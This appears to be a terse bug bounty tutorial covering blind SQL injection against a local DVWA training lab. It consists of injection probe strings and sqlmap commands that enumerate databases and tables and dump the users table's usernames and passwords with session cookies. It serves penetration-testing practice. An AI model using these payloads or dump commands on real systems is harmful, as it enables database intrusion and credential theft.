# bug-bounty-tutorial
bug bounty tutorial

## 13.dvwa-low-blind-sql-injection-low
```
x' OR 1='1
x' OR 1='2

sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" --dbs
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa --tables
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa -T users --columns

sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa -T users -C user,password --dump
```

## 14.dvwa-medium-blind-sql-injection
```
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=cf2jampv6cru89mjq7bq7lu55g; security=medium" --data="id=1&Submit=Submit" --dbs
```
